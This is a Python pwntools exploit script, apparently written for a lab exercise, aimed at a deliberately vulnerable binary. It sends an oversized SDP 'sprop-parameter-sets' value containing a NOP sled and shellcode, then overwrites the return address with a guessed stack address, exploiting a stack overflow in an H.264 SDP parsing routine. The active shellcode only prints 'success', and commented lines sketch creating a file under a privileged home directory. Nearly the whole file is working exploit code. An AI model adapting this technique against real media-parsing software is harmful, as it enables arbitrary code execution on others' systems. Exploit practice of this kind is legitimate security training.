#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
#


import pwn
from pwn import *

exe = context.binary = ELF('vuln_stackoverflow-entry')
context.terminal = ['bash', '-e', 'sh', '-c']
context.word_size = 32
context.arch = 'i386'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE disabled
# RWX:      Has RWX segments


vf = exe.symbols['h264_format_attr_sdp_parse']
print(hex(vf))

print(p32(vf))

p = start()

successFile = "/home/privileged/stackoverflow-entry"

print (hex(exe.address))

assembly = shellcraft.echo('success')
#assembly = shellcraft.pushstr(successFile)
#assembly += shellcraft.syscall('SYS_open', 'esp', 'O_CREAT | O_WRONLY', 777)
#assembly += shellcraft.echo('success', 'eax')

sps = 0xffffce48 #address of buffer sps
off = 32 #hit sled if guess slightly wrong

spslen = ppslen = 200
restlen = 20
bufferspace = spslen + ppslen # + restlen retaddr after

shellcode = asm(assembly)

print(hexdump(shellcode))

padding = bufferspace - len(shellcode)
print(len(shellcode), padding)
bufferfill = asm(shellcraft.nop())*padding
bufferfill += shellcode
print(len(bufferfill))
bufferfill = bufferfill[0:spslen] + ',' + bufferfill[spslen:]  # , not written to buffer
print('bufferfill', len(bufferfill))
payload = "sprop-parameter-sets=" + bufferfill + p32(sps+off) * 6
print('payload' , len(payload))

print(hexdump(payload))
p.send(payload)
p.sendline()

#p.interactive()
data = p.recvall()
print (data)
